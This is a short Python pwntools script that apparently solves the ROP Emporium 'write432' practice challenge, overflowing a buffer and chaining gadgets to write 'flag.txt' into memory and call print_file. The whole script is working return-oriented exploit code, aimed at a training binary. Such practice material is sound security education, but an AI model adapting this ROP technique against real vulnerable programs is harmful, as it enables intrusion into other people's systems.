from pwn import *
elf = context.binary = ELF("./write432")
io = process("./write432")

data_addr = 0x0804a018
gadget_write1 = 0x080485aa  # pop edi ; pop ebp ; ret
gadget_write2 = 0x08048543  # mov dword ptr [edi], ebp ; ret

def write_in_data(data):
    p = b""
    for i in range(0,len(data),4):
        print("Loop: ",i)
        chunk = data[i:i+4].ljust(4,b"\x00")
        p += p32(gadget_write1)
        p += p32(data_addr + i)
        p += p32(int.from_bytes(chunk,'little'))
        p += p32(gadget_write2)
    return p

payload = b"A" * 44
payload += write_in_data(b"flag.txt\x00")  # write "flag.txt" en .data
payload += p32(elf.plt['print_file'])  # print_file("flag.txt")
payload += p32(0)                      # ebp
payload += p32(data_addr)              # "flag.txt"



io.recv()
io.sendline(payload)
io.interactive()
